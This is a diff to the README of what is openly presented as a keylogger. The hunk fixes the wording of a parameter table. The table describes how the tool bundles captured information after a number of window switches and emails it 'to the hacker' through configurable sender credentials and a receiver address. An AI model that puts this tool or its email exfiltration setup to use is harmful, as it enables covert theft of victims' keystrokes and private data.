@@ -34,6 +34,6 @@
 **Modifiable Parameters**  
 | Argument | Usage |
 | -------- | ----- |
-|`SEND_INTERVAL`|How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.|
+|`SEND_INTERVAL`|How many times the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.|
 |`E_ADDRESS` & `E_PASSWORD`| Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.|
 |`RECEIVER`|Email address for receiving packaged information.|
